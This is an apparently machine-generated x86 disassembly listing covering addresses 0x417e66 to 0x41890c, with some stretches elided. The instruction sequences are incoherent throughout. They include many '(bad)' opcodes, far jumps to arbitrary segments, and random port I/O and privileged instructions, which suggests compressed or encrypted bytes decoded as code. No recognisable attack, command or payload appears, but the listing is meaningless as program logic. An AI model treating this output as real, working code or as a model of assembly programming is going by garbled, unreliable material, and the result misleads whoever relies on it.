  417e66:	add    DWORD PTR [bx+di],eax
  417e69:	add    BYTE PTR [eax],al
  417e6b:	add    DWORD PTR [eax],eax
  417e6d:	add    BYTE PTR [eax],ch
  417e6f:	ja     0x417ea9
  417e71:	fwait
  417e72:	dec    esi
  417e73:	cld    
  417e74:	pop    edx
  417e75:	push   ebp
  417e76:	push   es
  417e77:	adc    eax,0x1a1c81ec
  417e7c:	mov    esp,0x9c731d0f
  417e81:	cmp    eax,DWORD PTR [edi]
  417e83:	jmp    0xf957dced
  417e88:	mov    bh,0x63
  417e8a:	push   es
  417e8b:	imul   edi,DWORD PTR [esi],0x46
  417e8e:	push   ecx
  417e8f:	pop    ss
  417e90:	mov    ch,0x90
  417e92:	mov    dl,0xf9
  417e94:	jl     0x417e8a
  417e96:	push   0x56
  417e98:	test   DWORD PTR [edi],ebp
  417e9a:	or     eax,0xeec17d3a
  417e9f:	jge    0x417f01
  417ea1:	jnp    0x417e69
  417ea3:	cwde   
  417ea4:	sbb    al,0xe5
  417ea6:	test   al,0xd9
  417ea8:	fdiv   QWORD PTR [esi+0x48]
  417eab:	mov    esi,0x8a575c7d
  417eb0:	add    al,0x73
  417eb2:	ror    cl,cl
  417eb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417eb5:	out    dx,al
  417eb6:	fdivr  DWORD PTR [eax-0x3f4c11dd]
  417ebc:	scas   eax,DWORD PTR es:[edi]
  417ebd:	(bad)  
  417ebe:	mov    eax,ds:0xfb19654e
  417ec3:	stos   WORD PTR es:[edi],ax
  417ec5:	adc    al,0x6c
  417ec7:	xor    DWORD PTR [esi],ecx
  417ec9:	or     eax,0x20566a1
  417ece:	push   es
  417ecf:	inc    esi
  417ed0:	or     eax,DWORD PTR [edx]
  417ed2:	clc    
  417ed3:	or     eax,DWORD PTR [edx+0xe5880c1]
  417ed9:	in     al,dx
  417eda:	and    al,BYTE PTR [ebx+0x74d0e730]
  417ee0:	add    bl,BYTE PTR [ebx+eax*8-0x7070e696]
  417ee7:	xchg   ecx,eax
  417ee8:	loope  0x417e9a
  417eea:	and    al,0xf2
  417eec:	fnstsw WORD PTR [ecx+0x3]
  417eef:	fs leave 
  417ef1:	shl    DWORD PTR [eax-0x10],0x9e
  417ef5:	imul   ecx,DWORD PTR [eax-0x39],0x8ac7c5f6
  417efc:	dec    ebp
  417efd:	and    eax,0x220dfb34
  417f02:	push   edi
  417f03:	and    al,0x9a
  417f05:	push   es
  417f06:	add    al,0xa9
  417f08:	sbb    DWORD PTR [edx],edx
  417f0a:	gs cmp esi,DWORD PTR gs:[eax+0x66]
  417f0f:	and    BYTE PTR [esi-0x2a680db9],cl
  417f15:	add    BYTE PTR [esi],al
  417f17:	cmp    eax,0x29b2c076
  417f1c:	pop    ds
  417f1d:	inc    ebx
  417f1e:	hlt    
  417f1f:	or     esi,DWORD PTR [edi]
  417f21:	mov    cl,0x64
  417f23:	leave  
  417f24:	cmp    DWORD PTR [esi-0x42],0x9064c4cb
  417f2b:	cmp    bh,BYTE PTR [ecx-0x32]
  417f2e:	xlat   BYTE PTR ds:[ebx]
  417f2f:	push   edx
  417f30:	lds    ebp,FWORD PTR ds:0xde7aef79
  417f36:	loope  0x417f01
  417f38:	int    0x5
  417f3a:	repz adc edx,eax
  417f3d:	pop    edi
  417f3e:	jnp    0x417fa2
  417f40:	out    0xcc,eax
  417f42:	jno    0x417f10
  417f44:	es iret 
  417f46:	jp     0x417f6a
  417f48:	stc    
  417f49:	xchg   BYTE PTR [edi+0x6e97a803],bh
  417f4f:	das    
  417f50:	dec    ebp
  417f51:	adc    eax,0xb1a5487
  417f56:	fs js  0x417f85
  417f59:	lds    eax,FWORD PTR [ebx]
  417f5b:	jp     0x417f69
  417f5d:	jmp    0x417fbb
  417f5f:	repnz (bad) 
  417f61:	bound  ecx,QWORD PTR [ecx-0x5c2af794]
  417f67:	cwde   
  417f68:	das    
  417f69:	jle    0x417fd3
  417f6b:	push   cs
  417f6c:	iret   
  417f6d:	hlt    
	...
  417fd6:	(bad)  
  417fd7:	out    0xe6,al
  417fd9:	cmp    esp,esi
  417fdb:	cmp    edi,edi
  417fdd:	push   DWORD PTR [edx]
  417fdf:	xchg   edx,eax
  417fe0:	xor    al,bh
  417fe2:	jecxz  0x417f73
  417fe4:	push   edx
  417fe5:	sub    eax,0x10267
  417fea:	add    BYTE PTR [ecx],al
  417fec:	add    BYTE PTR [eax],al
  417fee:	pop    ebx
  417fef:	sbb    ah,BYTE PTR [edx]
  417ff1:	xlat   BYTE PTR ds:[ebx]
  417ff2:	jle    0x41805e
  417ff4:	or     BYTE PTR [ecx],dh
  417ff6:	mov    al,0x5
  417ff8:	adc    BYTE PTR ds:0xb1d09080,cl
  417ffe:	iret   
  417fff:	jl     0x41800e
  418001:	jo     0x417fe3
  418003:	sub    al,0x55
  418005:	push   es
  418006:	test   al,0x71
  418008:	mov    ch,ch
  41800a:	mov    ebp,0x3d1a8336
  41800f:	cld    
  418010:	push   cs
  418011:	retf   
  418012:	jb     0x418089
  418014:	jnp    0x418034
  418016:	aad    0x8e
  418018:	in     eax,dx
  418019:	or     al,0x20
  41801b:	cdq    
  41801c:	sbb    DWORD PTR [eax],0xbafecd63
  418022:	xchg   ebx,eax
  418023:	(bad)  
  418024:	jmp    0xa65f:0xcf76426e
  41802b:	pop    eax
  41802c:	cdq    
  41802d:	loop   0x418088
  41802f:	dec    esp
  418030:	outs   dx,BYTE PTR ds:[esi]
  418031:	fsubr  st(2),st
  418033:	stos   BYTE PTR es:[edi],al
  418034:	mov    al,ds:0xaa7ae85
  418039:	(bad)  
  41803a:	mov    ch,0x8a
  41803c:	nop
  41803d:	pusha  
  41803e:	fwait
  41803f:	push   0x9c9f4ee0
  418044:	nop
  418045:	pop    edx
  418046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418047:	(bad)  
  418048:	sub    al,0xfa
  41804a:	jo     0x4180b2
  41804c:	mov    bh,0x0
  41804e:	jle    0x417fd5
  418050:	pop    edx
  418051:	jmp    0x7a86:0xd0ceb182
  418058:	out    0xe7,eax
  41805a:	mov    al,ds:0x1297f6fd
  41805f:	fs out dx,al
  418061:	pop    ebx
  418062:	retf   
  418063:	jbe    0x41801b
  418065:	adc    eax,0x5dfcbfe8
  41806a:	arpl   ax,di
  41806c:	inc    ebx
  41806d:	mov    edi,0xbd011661
  418072:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418073:	mov    cl,BYTE PTR [edi+ebp*4]
  418076:	push   ecx
  418077:	jno    0x41802a
  418079:	dec    esp
  41807a:	xor    edi,DWORD PTR [ebx+0x51]
  41807d:	ffree  st(3)
  41807f:	pop    ds
  418080:	iret   
  418081:	inc    ebp
  418082:	pop    esp
  418083:	aas    
  418084:	jb     0x4180ae
  418086:	outs   dx,DWORD PTR ds:[esi]
  418087:	je     0x418106
  418089:	dec    ebp
  41808a:	stos   DWORD PTR es:[edi],eax
  41808b:	rcr    dh,cl
  41808d:	icebp  
  41808e:	std    
  41808f:	push   eax
  418090:	fwait
  418091:	aam    0xe7
  418093:	js     0x4180a1
  418095:	mov    ah,0x1b
  418097:	xor    cl,BYTE PTR [ecx]
  418099:	(bad)  
  41809a:	lods   al,BYTE PTR ds:[esi]
  41809b:	jle    0x418081
  41809d:	xor    edx,DWORD PTR ss:[edx]
  4180a0:	sbb    al,0xf
  4180a2:	sub    al,0x81
  4180a4:	cmp    DWORD PTR ds:0xed0e6afc,edi
  4180aa:	lea    ecx,[eax+0x61]
  4180ad:	call   0xbf6e:0x8f351154
  4180b4:	and    BYTE PTR [edi+0x15],0x5a
  4180b8:	sub    BYTE PTR [edx-0x37],ah
  4180bb:	sbb    esp,DWORD PTR [edi+0x75]
  4180be:	mov    edi,0xd1aa0604
  4180c3:	int3   
  4180c4:	loope  0x41813f
  4180c6:	ret    0x6683
  4180c9:	adc    DWORD PTR [eax],ebp
  4180cb:	dec    esi
  4180cc:	in     eax,0xeb
  4180ce:	xor    ebx,edi
  4180d0:	les    esp,FWORD PTR [edi+0x344c8e9d]
  4180d6:	pop    ds
  4180d7:	sahf   
  4180d8:	jmp    0x82f27815
  4180dd:	mov    dl,0xb1
  4180df:	jge    0x4180d6
  4180e1:	add    BYTE PTR [edx-0x34d4303c],ah
  4180e7:	scas   eax,DWORD PTR es:[edi]
  4180e8:	int3   
  4180e9:	sbb    dl,cl
  4180eb:	fdivr  DWORD PTR [edx-0x3a]
	...
  418156:	test   eax,0xff456b7e
  41815b:	push   ebp
  41815c:	scas   eax,DWORD PTR es:[edi]
  41815d:	(bad)  
  41815e:	mov    ds:0x542fdebc,eax
  418163:	jo     0x4181d4
  418165:	and    BYTE PTR [edi+0x3],0x1
  418169:	add    BYTE PTR [eax],al
  41816b:	add    DWORD PTR [eax],eax
  41816d:	add    BYTE PTR [edx],bh
  41816f:	ja     0x41810a
  418171:	jge    0x4180f6
  418173:	and    esp,DWORD PTR [edi]
  418175:	add    al,0x74
  418177:	cld    
  418178:	mov    ds:0x986384e6,eax
  41817d:	xor    eax,ecx
  41817f:	jecxz  0x41815a
  418181:	rol    BYTE PTR [edx+0xb],0xe
  418185:	sbb    eax,0xec4555e0
  41818a:	fisub  DWORD PTR [edi]
  41818c:	ret    
  41818d:	inc    edx
  41818e:	aas    
  41818f:	xor    dh,ch
  418191:	jmp    0xbfc5a165
  418196:	push   cs
  418197:	inc    cl
  418199:	sub    bl,BYTE PTR [eax-0x38]
  41819c:	push   ds
  41819d:	dec    ebx
  41819e:	ss inc eax
  4181a0:	adc    BYTE PTR [ebp-0x756657e0],ch
  4181a6:	in     eax,0x25
  4181a8:	adc    eax,0x43d497ff
  4181ad:	icebp  
  4181ae:	xor    al,0x7
  4181b0:	dec    esi
  4181b1:	adc    al,0x1d
  4181b3:	pop    esi
  4181b4:	fisubr DWORD PTR [edx+0x6b305214]
  4181ba:	out    0x40,al
  4181bc:	mov    al,ds:0xc734bb4e
  4181c1:	xchg   esi,eax
  4181c2:	jo     0x418222
  4181c4:	out    0xcd,eax
  4181c6:	xlat   BYTE PTR ds:[ebx]
  4181c7:	xchg   cl,bh
  4181c9:	mov    ss,WORD PTR [ebx+0x49ce684]
  4181cf:	dec    eax
  4181d0:	add    al,0xdd
  4181d2:	pusha  
  4181d3:	fld    TBYTE PTR [eax-0x7d9ccb0b]
  4181d9:	jae    0x4181c5
  4181db:	ja     0x4181e5
  4181dd:	jmp    0xfc13:0xe0f10dc8
  4181e4:	xchg   esp,eax
  4181e5:	(bad)  
  4181e6:	sbb    al,0xd9
  4181e8:	gs test edi,ebx
  4181eb:	repnz sti 
  4181ed:	or     al,bh
  4181ef:	(bad)  
  4181f0:	cs jge 0x4181ee
  4181f3:	stos   BYTE PTR es:[edi],al
  4181f4:	aas    
  4181f5:	lds    ecx,FWORD PTR [esi+ebx*1]
  4181f8:	dec    edx
  4181f9:	scas   eax,DWORD PTR es:[edi]
  4181fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181fb:	enter  0xd920,0x21
  4181ff:	shl    DWORD PTR [ebp+0x1ad6a8b6],0xe5
  418206:	adc    ah,BYTE PTR [edi]
  418208:	shr    BYTE PTR [eax+0x43],0x4b
  41820c:	or     esp,ecx
  41820e:	jbe    0x418193
  418210:	push   edx
  418211:	push   ds
  418212:	add    bh,BYTE PTR [ebx]
  418214:	loop   0x4181e3
  418216:	add    BYTE PTR [esi-0x7c],bh
  418219:	pop    esi
  41821a:	ret    0x3133
  41821d:	inc    ebp
  41821e:	mov    ebx,0xd51a943f
  418223:	loopne 0x4181dc
  418225:	push   esp
  418226:	dec    eax
  418227:	sbb    edi,DWORD PTR [esi]
  418229:	aas    
  41822a:	jmp    0x2463:0x669874c
  418231:	jo     0x418222
  418233:	out    dx,al
  418234:	addr16 inc esp
  418236:	xor    al,0xdf
  418238:	idiv   DWORD PTR [edi+eiz*1-0x3]
  41823c:	test   DWORD PTR [esi],edx
  41823e:	mov    bl,0xe5
  418240:	prefetchwt1 (bad)
  418241:	or     eax,0x567338d3
  418246:	lds    edx,FWORD PTR [ebp+eiz*4-0x4a]
  41824a:	jl     0x4181e1
  41824c:	sub    edx,ebp
  41824e:	dec    cl
  418250:	xchg   ebp,eax
  418251:	ins    DWORD PTR es:[edi],dx
  418252:	and    BYTE PTR [esi+0x5ee63143],bh
  418258:	ins    DWORD PTR es:[edi],dx
  418259:	nop
  41825a:	xchg   esp,eax
  41825b:	push   ebx
  41825c:	xor    BYTE PTR [edx-0x45],0x58
  418260:	dec    eax
  418261:	add    al,0x0
  418263:	jno    0x4181fc
  418265:	mov    ds:0xce242247,al
  41826a:	mov    al,ds:0xf1ce53
	...
  4182d3:	add    BYTE PTR [eax],al
  4182d5:	add    BYTE PTR [edi],dh
  4182d7:	xchg   edx,eax
  4182d8:	and    al,0x83
  4182da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182db:	mov    bh,0xb7
  4182dd:	mov    dh,0x40
  4182df:	mov    ebx,0xb4bbb8d6
  4182e4:	xor    DWORD PTR ds:0x10467,eax
  4182ea:	add    BYTE PTR [ecx],al
  4182ec:	add    BYTE PTR [eax],al
  4182ee:	pop    ds
  4182ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182f0:	pop    ebp
  4182f1:	xchg   esi,eax
  4182f2:	out    0xd3,al
  4182f4:	sbb    al,0x22
  4182f6:	add    BYTE PTR [ebx],0x71
  4182f9:	and    edx,DWORD PTR cs:[ebx+0x24b41759]
  418300:	sbb    eax,0x463d7f40
  418305:	cmp    esi,DWORD PTR [eax-0x3e]
  418308:	lea    esp,fs:[ebp+edx*8-0x58d3e1b1]
  418310:	test   al,0x31
  418312:	and    ecx,edx
  418314:	mov    bh,0xbf
  418316:	pushw  es
  418318:	inc    ebp
  418319:	sbb    DWORD PTR [ebp+0x1],esi
  41831c:	pop    eax
  41831d:	data16 sahf 
  41831f:	jo     0x418354
  418321:	int3   
  418322:	cmp    BYTE PTR [eax+0x6b3015df],bh
  418328:	or     al,0xcc
  41832a:	and    ebp,0x71b22141
  418330:	sub    al,0x99
  418333:	aad    0x9a
  418335:	cmp    DWORD PTR [edi-0x71],ebp
  418338:	sub    BYTE PTR [edx+0x1e0c053e],dl
  41833e:	out    dx,al
  41833f:	clc    
  418340:	add    ebp,0xffffff88
  418343:	sub    BYTE PTR ds:0xca650b19,ch
  418349:	dec    edi
  41834a:	or     eax,0xed843e76
  41834f:	mov    bl,0xfe
  418351:	jmp    0x3851fa63
  418356:	js     0x418326
  418358:	je     0x41839b
  41835a:	scas   eax,DWORD PTR es:[edi]
  41835b:	cmp    dh,BYTE PTR [ecx]
  41835d:	std    
  41835e:	pop    es
  41835f:	pop    ds
  418360:	retf   0x1bf5
  418363:	jae    0x41831c
  418365:	retf   0x3d90
  418368:	mov    dl,0x8f
  41836a:	scas   al,BYTE PTR es:[edi]
  41836b:	in     eax,0x2e
  41836d:	sbb    ebx,DWORD PTR [edi]
  41836f:	dec    ebp
  418370:	cwde   
  418371:	sbb    BYTE PTR [eax+0x9],bh
  418374:	adc    al,BYTE PTR [ebx]
  418376:	jb     0x41835a
  418378:	sub    BYTE PTR [ebx],cl
  41837a:	pop    ebx
  41837b:	sahf   
  41837c:	in     eax,0x5
  41837e:	cwde   
  41837f:	fld    TBYTE PTR ds:0xdad57e00
  418385:	mov    al,ds:0x1c4a60ac
  41838a:	mov    ecx,ss
  41838c:	sbb    DWORD PTR [edi-0x55],edi
  41838f:	pop    ss
  418390:	xor    ebp,edi
  418392:	(bad)  
  418393:	pushf  
  418394:	adc    BYTE PTR [ebp+0x2e],al
  418397:	imul   ebp,DWORD PTR [eax-0x76e81fe7],0x514aad5e
  4183a1:	jmp    0x10fd43b9
  4183a6:	adc    ebp,esi
  4183a8:	or     al,0x7b
  4183aa:	sahf   
  4183ab:	push   eax
  4183ac:	ret    
  4183ad:	repnz inc esi
  4183af:	movaps XMMWORD PTR ds:0x9f7e4653,xmm3
  4183b6:	cdq    
  4183b7:	xchg   BYTE PTR [ecx+0x1a],al
  4183ba:	add    DWORD PTR [edi],esp
  4183bc:	test   BYTE PTR [esi+0x45ddc3fb],dl
  4183c2:	mov    cl,BYTE PTR gs:[ebx-0x5d1a482a]
  4183c9:	or     BYTE PTR [ebx+edx*1-0x5c5eb959],0x2
  4183d1:	ret    
  4183d2:	push   0xffffff83
  4183d4:	pop    ds
  4183d5:	cld    
  4183d6:	xchg   edi,eax
  4183d7:	(bad)  [ecx]
  4183d9:	pop    edx
  4183da:	aam    0xbd
  4183dc:	mov    dl,0x45
  4183de:	xor    dh,ch
  4183e0:	mov    ebp,0xa231f441
  4183e5:	jns    0x41840b
  4183e7:	lods   eax,DWORD PTR ds:[esi]
  4183e8:	pop    eax
  4183e9:	inc    DWORD PTR [eax-0x40]
  4183ec:	sub    DWORD PTR [ebp+0x0],0x0
	...
  418453:	add    BYTE PTR [eax],al
  418455:	add    ah,bl
  418457:	mov    bl,0x3f
  418459:	push   eax
  41845a:	jg     0x418438
  41845c:	(bad)  
  41845d:	mov    edi,0x14d871ac
  418462:	or     al,0xd5
  418464:	es sbb eax,0x10567
  41846a:	add    BYTE PTR [ecx],al
  41846c:	add    BYTE PTR [eax],al
  41846e:	and    DWORD PTR [ebx+0x6bbdfb4e],ebp
  418474:	mov    eax,ds:0xb89090fb
  418479:	jmp    0x99581cc4
  41847e:	inc    ebx
  41847f:	mov    BYTE PTR [esi-0x2172ca35],al
  418485:	jae    0x4184ec
  418487:	leave  
  418488:	cwde   
  418489:	(bad)  
  41848a:	xchg   ecx,eax
  41848b:	ret    
  41848c:	mov    bh,0xc5
  41848e:	and    DWORD PTR ds:0x45faec3b,0x66
  418495:	shr    DWORD PTR [ebx+0x12836491],cl
  41849b:	jmp    0x3f69:0x223082f9
  4184a2:	jmp    0xf9cc:0x4529fd11
  4184a9:	hlt    
  4184aa:	mov    BYTE PTR ds:0xd861e2d6,bl
  4184b0:	std    
  4184b1:	les    esp,FWORD PTR [edx+0x73a5cce]
  4184b7:	pop    esi
  4184b8:	add    eax,DWORD PTR [ecx+0x25]
  4184bb:	lds    edi,FWORD PTR [edx+0x417f029f]
  4184c1:	jmp    FWORD PTR [eax+0x624d109c]
  4184c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184c8:	dec    esp
  4184c9:	imul   esi,esi,0x35cca778
  4184cf:	aad    0x59
  4184d1:	add    eax,0xf8b9abae
  4184d6:	or     esp,eax
  4184d8:	sti    
  4184d9:	xor    edi,eax
  4184db:	mov    dl,0xdc
  4184dd:	retf   0x8f39
  4184e0:	or     DWORD PTR [eax-0x6646d337],ecx
  4184e6:	jnp    0x418528
  4184e8:	add    BYTE PTR [ecx+0x51db1f6d],0xf7
  4184ef:	xor    al,0x4e
  4184f1:	scas   eax,DWORD PTR es:[edi]
  4184f2:	mov    es,WORD PTR [edi+esi*1]
  4184f5:	stos   BYTE PTR es:[edi],al
  4184f6:	push   ebx
  4184f7:	(bad)  
  4184f8:	mov    ds:0x233d3beb,eax
  4184fd:	inc    esp
  4184fe:	add    ebx,edx
  418500:	js     0x418569
  418502:	jmp    0x69ac946
  418507:	add    al,0x3c
  418509:	xchg   DWORD PTR [ecx],ecx
  41850b:	iret   
  41850c:	leave  
  41850d:	push   edx
  41850e:	sub    eax,0xe19186a9
  418513:	test   al,0x38
  418515:	fcomp  st(7)
  418517:	sbb    BYTE PTR [esi],dl
  418519:	test   al,0xd3
  41851b:	push   es
  41851c:	cmc    
  41851d:	sub    DWORD PTR [eax+0x3cf164af],esp
  418523:	adc    dh,ah
  418525:	fldenv [eax-0x6f]
  418528:	test   DWORD PTR [edx],ecx
  41852a:	push   esi
  41852b:	hlt    
  41852c:	retf   0x2a0b
  41852f:	in     al,0x15
  418531:	shl    DWORD PTR [ecx-0x6e],0x3d
  418535:	pushf  
  418536:	mov    al,0x86
  418538:	lods   al,BYTE PTR ds:[esi]
  418539:	fs cmp eax,0x78ccde0
  41853f:	jne    0x418589
  418541:	xchg   DWORD PTR [esi-0x303119f5],ebx
  418547:	ret    0x5580
  41854a:	xchg   esi,ebp
  41854c:	jae    0x4184f6
  41854e:	leave  
  41854f:	xchg   ebx,eax
  418550:	jo     0x4185c7
  418552:	ds loope 0x4184da
  418555:	adc    al,0xa3
  418557:	sub    dl,BYTE PTR [ecx+edi*4]
  41855a:	loop   0x4185bd
  41855c:	xor    al,0x4a
  41855e:	neg    BYTE PTR [esi+0x2ca71caf]
  418564:	hlt    
  418565:	xchg   DWORD PTR [eax-0x15],ecx
  418568:	mov    dl,0xa
  41856a:	cmp    DWORD PTR [esi+0xd936],ebx
	...
  4185d4:	add    BYTE PTR [eax],al
  4185d6:	inc    ecx
  4185d7:	stc    
  4185d8:	mov    ebx,ebx
  4185da:	mov    ebx,0x26fb51fb
  4185df:	lods   al,BYTE PTR ds:[esi]
  4185e0:	imul   dl
  4185e2:	into   
  4185e3:	out    0x39,eax
  4185e5:	mul    BYTE PTR [edi+0x6]
  4185e8:	add    DWORD PTR [eax],eax
  4185ea:	add    BYTE PTR [ecx],al
  4185ec:	add    BYTE PTR [eax],al
  4185ee:	mov    ecx,0xcfbc6847
  4185f3:	mov    bh,0x3c
  4185f5:	push   ss
  4185f6:	jp     0x4185d6
  4185f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185f9:	push   edi
  4185fa:	jecxz  0x418587
  4185fc:	pop    ecx
  4185fd:	cmc    
  4185fe:	mov    ds:0x1742ee76,al
  418603:	inc    ecx
  418604:	mov    eax,ds:0x920f14f2
  418609:	cmp    cl,ah
  41860b:	(bad)  
  41860c:	mov    bl,0xc1
  41860e:	push   es
  41860f:	xchg   edx,eax
  418610:	and    al,0x7
  418612:	jbe    0x418692
  418614:	clc    
  418615:	fwait
  418616:	inc    DWORD PTR [eax+0x100a1db7]
  41861c:	push   eax
  41861d:	mov    ah,0x4f
  41861f:	(bad)  
  418620:	sbb    ebp,edx
  418622:	adc    eax,0xcc201a87
  418627:	mov    dl,0x33
  418629:	adc    al,0x1b
  41862b:	sar    DWORD PTR [eax],1
  41862d:	xor    ah,0xb
  418630:	fidivr DWORD PTR [edi+0x2]
  418633:	ins    BYTE PTR es:[edi],dx
  418634:	jp     0x418667
  418636:	jns    0x4185e6
  418638:	arpl   WORD PTR [ecx+0xb65eba8],dx
  41863e:	lahf   
  41863f:	sbb    esi,eax
  418641:	push   esp
  418642:	inc    ebx
  418643:	(bad)  
  418644:	jg     0x4186a1
  418646:	xor    ch,BYTE PTR [ebx+0x5c5f278]
  41864c:	imul   ebp,DWORD PTR [edx-0x31],0x1607117c
  418653:	outs   dx,DWORD PTR ds:[esi]
  418654:	retf   0x48f8
  418657:	jecxz  0x418646
  418659:	repz in eax,0x26
  41865c:	mov    esp,ebx
  41865e:	and    DWORD PTR ds:0x879e22a1,esp
  418664:	jge    0x418670
  418666:	add    DWORD PTR [ecx-0x7bfc6603],0x363b7ab2
  418670:	sbb    eax,0x48052108
  418675:	cmp    eax,0x915125e4
  41867a:	pop    esp
  41867b:	mov    ebx,0x9b489f36
  418680:	hlt    
  418681:	fwait
  418682:	pop    ebp
  418683:	mov    ah,0x9b
  418685:	xchg   edi,eax
  418686:	fbld   TBYTE PTR [ebx-0x44]
  418689:	mov    WORD PTR [edi],fs
  41868b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41868c:	sub    eax,0x9179ac3
  418691:	(bad)  
  418692:	pop    edi
  418693:	pop    edx
  418694:	push   es
  418695:	mov    edx,DWORD PTR [ebx]
  418697:	(bad)  
  418698:	(bad)  
  418699:	and    ah,BYTE PTR gs:[edx]
  41869c:	push   eax
  41869d:	push   ebx
  41869e:	in     eax,0xb
  4186a0:	or     BYTE PTR [esi+0x5a],al
  4186a3:	pop    edx
  4186a4:	pop    ebp
  4186a5:	stc    
  4186a6:	mov    eax,0xb19a8fa7
  4186ab:	mov    esi,0x428534f
  4186b0:	xor    DWORD PTR [esi+0x47eb05a7],edi
  4186b6:	stos   BYTE PTR es:[edi],al
  4186b7:	popa   
  4186b8:	mov    ebp,ecx
  4186ba:	lods   al,BYTE PTR ds:[esi]
  4186bb:	cdq    
  4186bc:	mov    ebx,0xae790adf
  4186c1:	addr16 out 0x9f,eax
  4186c4:	mul    DWORD PTR [eax-0x294254a4]
  4186ca:	sub    al,0x44
  4186cc:	push   esp
  4186cd:	sub    dh,BYTE PTR [eax-0x16d6f0d9]
  4186d3:	ss jno 0x418733
  4186d6:	mov    esi,0xbd531d99
  4186db:	test   eax,0x34a3f689
  4186e0:	mov    esp,0x8b1f18a7
  4186e5:	push   esp
  4186e6:	rol    DWORD PTR [esi+ebp*1],1
  4186e9:	push   ds
  4186ea:	js     0x4186a2
  4186ec:	jmp    0x418726
	...
  418756:	xchg   ebx,eax
  418757:	sub    BYTE PTR [eax-0x604344c4],ah
  41875d:	scas   eax,DWORD PTR es:[edi]
  41875e:	or     al,0x8d
  418760:	cmp    edx,edx
  418762:	mov    ebx,0x67a9f052
  418767:	pop    es
  418768:	add    DWORD PTR [eax],eax
  41876a:	add    BYTE PTR [ecx],al
  41876c:	add    BYTE PTR [eax],al
  41876e:	stos   BYTE PTR es:[edi],al
  41876f:	mov    ecx,DWORD PTR [ebp+0x5f43d36c]
  418775:	or     DWORD PTR [eax],esp
  418777:	mov    ecx,0x23e334b8
  41877c:	cmc    
  41877d:	(bad)  
  41877e:	fdivr  DWORD PTR [ebx+esi*1]
  418781:	cld    
  418782:	std    
  418783:	int    0xf6
  418785:	xchg   esp,eax
  418786:	fs es pop ecx
  418789:	pop    ebx
  41878a:	push   ebp
  41878b:	mov    BYTE PTR [eax],ah
  41878d:	push   edi
  41878e:	out    0xc,al
  418790:	jecxz  0x418755
  418792:	jl     0x4187df
  418794:	sbb    eax,0xae734b9f
  418799:	lds    ecx,FWORD PTR [ebx]
  41879b:	lea    edi,[esi-0x6cb53841]
  4187a1:	es data16 sti 
  4187a4:	das    
  4187a5:	call   0x7523:0x15bce057
  4187ac:	in     eax,0xa5
  4187ae:	jo     0x418746
  4187b0:	je     0x4187e7
  4187b2:	xor    eax,0x9039a7e4
  4187b7:	pop    ecx
  4187b8:	out    0x43,al
  4187ba:	test   al,0x47
  4187bc:	lahf   
  4187bd:	popf   
  4187be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187bf:	mov    BYTE PTR [edi-0x7396b994],bh
  4187c5:	popf   
  4187c6:	sbb    al,0x18
  4187c8:	fst    DWORD PTR ds:0x1d1433d6
  4187ce:	sbb    dh,BYTE PTR [ebx+edi*2-0x7d61c0ee]
  4187d5:	loop   0x41878d
  4187d7:	dec    edx
  4187d8:	push   es
  4187d9:	mov    edx,0xc8e8e004
  4187de:	xor    eax,0x82474d53
  4187e3:	fisub  WORD PTR [ebp+0x80e55d9]
  4187e9:	stos   DWORD PTR es:[edi],eax
  4187ea:	lsl    eax,WORD PTR [esi+0x1734d9ab]
  4187f1:	mov    cl,0x6b
  4187f3:	and    bh,BYTE PTR ds:0x1b910803
  4187f9:	push   esp
  4187fa:	inc    eax
  4187fb:	jo     0x41880f
  4187fd:	sbb    BYTE PTR [edx-0x6ee71976],dh
  418803:	je     0x4187fb
  418805:	(bad)  
  418807:	test   DWORD PTR [ecx-0x49],ebx
  41880a:	loope  0x418888
  41880c:	xchg   BYTE PTR [ecx],ah
  41880e:	rol    BYTE PTR ds:[ebx-0x1a],0xa0
  418813:	scas   eax,DWORD PTR es:[edi]
  418814:	(bad)  
  418815:	mov    al,ds:0x595f24fe
  41881a:	(bad)  
  41881b:	push   ss
  41881c:	retf   
  41881d:	mov    eax,ds:0x39547d0c
  418822:	popa   
  418823:	aas    
  418824:	inc    esp
  418825:	jnp    0x418815
  418827:	mov    BYTE PTR [ebp+0x47],al
  41882a:	pop    ss
  41882b:	cmp    ecx,DWORD PTR [ebx-0x51]
  41882e:	mov    esi,esp
  418830:	xor    BYTE PTR [ebx-0x1307a2b4],bl
  418836:	and    al,0x3f
  418838:	es add ebp,edx
  41883b:	adc    bl,BYTE PTR [edx+0x56]
  41883e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41883f:	into   
  418840:	imul   ecx,DWORD PTR [ebp+0x1c149d3c],0x579e466c
  41884a:	and    eax,0x40506b78
  41884f:	sub    DWORD PTR [edx],ebx
  418851:	test   al,0x89
  418853:	mov    ah,BYTE PTR [ebx+esi*4]
  418856:	inc    esp
  418857:	ret    0xdea1
  41885a:	(bad)  
  41885b:	neg    esi
  41885d:	push   ebx
  41885e:	mov    bl,0xf5
  418860:	xlat   BYTE PTR ds:[ebx]
  418861:	cdq    
  418862:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418863:	cmp    BYTE PTR [edi+0x592e7af6],ch
  418869:	mov    edx,DWORD PTR [eax+0xa6fa74]
	...
  4188d3:	add    BYTE PTR [eax],al
  4188d5:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  4188dc:	hlt    
  4188dd:	fbld   TBYTE PTR [esi+0x349c3acd]
  4188e3:	loopne 0x4188d9
  4188e5:	mov    al,ds:0x10867
  4188ea:	add    BYTE PTR [ecx],al
  4188ec:	add    BYTE PTR [eax],al
  4188ee:	pop    ss
  4188ef:	push   esi
  4188f0:	repz bound edx,QWORD PTR [ebx]
  4188f3:	pop    ebp
  4188f4:	mov    ch,0x36
  4188f6:	imul   eax,DWORD PTR [esp+eax*4-0x2b],0xffffffb0
  4188fb:	push   cs
  4188fc:	in     al,0xa4
  4188fe:	adc    al,0x40
  418900:	mov    eax,0x1b6b163d
  418905:	call   0x5f0f:0x79a0f803
  41890c:	pop    esi
